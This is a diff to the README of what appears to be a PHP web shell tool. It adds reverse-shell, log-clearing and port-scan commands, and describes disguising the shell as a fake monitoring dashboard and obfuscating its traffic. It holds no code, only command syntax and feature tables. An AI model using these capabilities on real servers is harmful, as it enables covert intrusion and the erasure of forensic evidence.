@@ -78,12 +78,12 @@ flowchart LR
 | Communication | XOR+gzip+base64 in POST body, obfuscated header/footer | 3 modes: `plain` (cleartext), `mimic` (base64 + random param names), `rc4` (RC4 + per-build shuffled base64 alphabet) |
 | Interface | Python CLI client | Browser terminal — no tooling on operator machine |
 | Camouflage | Bare PHP snippet | Fake monitoring dashboard (3 themes) |
-| Modules | 30+ (reverse shell, SQL, net scan, proxy…) | Shell, upload, download, tab-complete |
+| Modules | 30+ (reverse shell, SQL, net scan, proxy…) | Shell, upload, download, tab-complete, reverse shell, log clearing, port scan |
 | Exec methods | 9 — `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `pcntl_fork`, `python_eval`, `perl_system` — shuffled | 4–6 per build — `exec`, `shell_exec`, `system` always present; `passthru`, `popen`, `proc_open` randomly dropped (~30% each); weighted order (reliable methods tend first) |
 | `disable_functions` bypass | Yes — mod_cgi + `.htaccess` (Apache only, requires `AllowOverride` + write access) | No — not planned as a priority; the technique requires Apache + mod_cgi + AllowOverride + web-writable directory, which are rarely all met in prod |
-| Reverse shell | Yes | No (planned) |
-| Log clearing | Yes | No (planned) |
-| Port scan | Yes | No (planned) |
+| Reverse shell | Yes | Yes — `revshell <IP> <PORT>` (bash → python3 → perl → php, first available) |
+| Log clearing | Yes | Yes — `clearlog <file> <pattern>` strips matching lines in-place |
+| Port scan | Yes | Yes — `portscan <ip[-range]> <ports>` via fsockopen from the target host |
 | SQL console | Yes | No |
 
 **Use Weevely when**: you need CLI automation, module ecosystem (SQL, reverse shell, scan), or obfuscated HTTP transport matters more than visual camouflage.
@@ -374,6 +374,9 @@ Once deployed and authenticated, the shell supports:
 | `cd /path` | Change working directory (persisted across commands) |
 | `download /path/to/file` | Download file to browser |
 | `upload /remote/path` | Upload local file via browser dialog |
+| `revshell <IP> <PORT>` | Spawn reverse shell — tries bash, python3, perl, php in order (first available wins) |
+| `clearlog <file> <pattern>` | Strip lines matching `<pattern>` (case-insensitive regex) in-place from `<file>` |
+| `portscan <ip[-range]> <ports>` | TCP port scan from the target host — e.g. `portscan 10.0.0.1-254 22,80,443` or `portscan 10.0.0.5 20-25,80` |
 | `clear` | Clear terminal output |
 | `Tab` | Autocomplete files and commands |
 | `↑ / ↓` | Command history navigation |
